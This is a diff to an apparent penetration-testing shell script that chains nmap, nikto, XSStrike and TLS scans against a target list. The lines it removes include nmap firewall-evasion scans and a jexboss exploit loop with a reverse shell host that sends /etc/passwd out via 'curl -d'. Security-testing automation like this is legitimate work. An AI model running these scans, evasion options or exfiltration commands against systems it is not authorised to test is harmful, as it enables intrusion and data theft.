@@ -109,7 +109,7 @@ cat $wrktmp/TempTargets | sort | uniq > $wrktmp/IPtargets
 echo "--------------------------------------------------"
 echo "Parsing all the PDF documents found"
 echo "--------------------------------------------------"
-if [ -r $(ls $wrkpth/Harvester/Evidence/ | grep pdf) ]; then
+if [ -d $wrkpth/Harvester/Evidence/ ]; then
     for files in $(ls $wrkpth/Harvester/Evidence/ | grep pdf);do
         pdfinfo $files.pdf | grep Author | cut -d " " -f 10 | tee -a $wrkpth/Harvester/tempusr
     done
@@ -180,7 +180,7 @@ echo "--------------------------------------------------"
 echo
 echo "Full TCP SYN & UDP scan on live targets"
 nmap -A -Pn -R --reason --resolve-all -sS -sU -sV -T4 -p $(echo ${OpenPORT[*]} | sed 's/ /,/g') --script=ssl-enum-ciphers,vulners -iL $pth/FinalTargets -oA $wrkpth/Nmap/$prj_name-nmap_portknock
-if [ -r $wrkpth/Nmap/$prj_name-nmap_portknock.xml  ] && [ -r $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap ]; then
+if [ -r $wrkpth/Nmap/$prj_name-nmap_portknock.xml ] && [ -r $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap ]; then
     xsltproc $wrkpth/Nmap/$prj_name-nmap_portknock.xml -o $wrkpth/Nmap/$prj_name-nmap_portknock.html
     cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep ' 25/open' | cut -d ' ' -f 2 > $wrkpth/Nmap/SMTP
     cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep ' 53/open' | cut -d ' ' -f 2 > $wrkpth/Nmap/DNS
@@ -192,15 +192,6 @@ if [ -r $wrkpth/Nmap/$prj_name-nmap_portknock.xml  ] && [ -r $wrkpth/Nmap/$prj_n
     cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep ssl | grep open | cut -d ' ' -f 2 > $wrkpth/Nmap/SSL
 fi
 echo
-
-# Nmap - Firewall evasion
-# echo
-# echo "Firewall evasion scan -- You know just in case ;)"
-# nmap -f -mtu 24 --randomize-hosts --reason --resolve-all --spoof-mac Dell -T2 -A -Pn -R -sS -sU -sV --script=vulners -iL $pth/FinalTargets -oA $wrkpth/Nmap/FW_Evade
-# nmap -D RND:10 --badsum --data-length 24 --randomize-hosts -reason --resolve-all -T2 -A -Pn -R -sS -sU -sV --script=vulners -iL $pth/FinalTargets-oA $wrkpth/Nmap/FW_Evade2
-# xsltproc $wrkpth/Nmap/FW_Evade.xml -o $wrkpth/Nmap/FW_Evade.html
-# xsltproc $wrkpth/Nmap/FW_Evade2.xml -o $wrkpth/Nmap/FW_Evade2.html
-# echo
 
 # Using Wappalyzer
 echo "--------------------------------------------------"
@@ -216,6 +207,7 @@ for web in $(cat $pth/FinalTargets);do
         fi
     done
 done
+echo
 
 # Using nikto
 echo "--------------------------------------------------"
@@ -269,6 +261,7 @@ for web in $(cat $pth/FinalTargets);do
         fi
     done
 done
+echo
 
 # Using XSStrike
 echo "--------------------------------------------------"
@@ -284,11 +277,7 @@ for web in $(cat $pth/FinalTargets);do
         fi
     done
 done
-
-# Using Grabber
-# for web in $(cat $pth/FinalTargets);do
-#     grabber -s -x -b -z -d  SPIDER -j -c -e -u https://$web | tee $wrkpth/Grabber/$prj_name-$web.txt
-# done
+echo
 
 # Using GOLismero
 echo "--------------------------------------------------"
@@ -304,6 +293,7 @@ for web in $(cat $pth/FinalTargets);do
         fi
     done
 done
+echo
 
 # Using testssl & sslcan
 echo "--------------------------------------------------"
@@ -320,44 +310,7 @@ for IP in $(cat $pth/FinalTargets);do
         fi
     done
 done
-
-# # Perform targeted scan using jexboss
-# cd /opt/jexboss/
-# echo
-# echo "This is the part where you turn on netcat (e.g., nc -l -p 443)"
-# echo
-# echo "What is the reverse host (your machine IP address)?"
-# read RHOST
-# echo "What is the reverse port (listening port)?"
-# read RPORT
-# echo
-# for IP in $(cat $wrkpth/Nmap/livehosts)
-# do
-# 	for PORTNUM in ${PORT[*]}
-# 	do
-# 		STAT1=$(cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep $IP | grep "Status: Up" -m 1 -o | cut -c 9-10)
-# 		STAT2=$(cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep $IP | grep "$PORTNUM/open" -m 1 -o | grep "open" -o)
-# 		STAT3=$(cat $wrkpth/Nmap/$prj_name-nmap_portknock.gnmap | grep $IP | grep "$PORTNUM/filtered" -m 1 -o | grep "filtered" -o)
-# 		if [ "$STAT1" == "Up" ] && [ "$STAT2" == "open" ] || [ "$STAT3" == "filtered" ];then
-# 			if [ "$PORTNUM" == "443" ];then
-# 				python jexboss.py -u https://$IP | tee -a "$wrkpth/JexBoss/Logs/$IP-$PORTNUM"
-# 			fi
-# 			python jexboss.py -u http://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$wrkpth/JexBoss/$IP-$PORTNUM"
-# 			echo >> $wrkpth/JexBoss/$IP-$PORTNUM
-# 			python jexboss.py -u https://$IP:$PORTNUM -A --reverse-host $RHOST:$RPORT -x "curl -d @/etc/passwd $RHOST:$RPORT" | tee -a "$wrkpth/JexBoss/$IP-$PORTNUM"
-# 		fi
-# 	done
-# done
-# cp /tmp/jexboss/jexboss_$TodaysYEAR-$TodaysDAY.log $wrkpth/JexBoss/
-
-# # Using sniper
-# echo "--------------------------------------------------"
-# echo "Performing scan using Sn1per"
-# echo "--------------------------------------------------"
-# for web in $(cat $pth/FinalTargets);do
-#     sniper -w $prj_name -f $wrkpth/FinalTargets -m nuke
-# done
-# echo
+echo
 
 # Add zipping of all content and sending it via some medium (e.g., email, ftp, etc)
 zip -ru9 $pth/$prj_name-$TodaysDAY-$TodaysYEAR.zip $pth/$TodaysYEAR
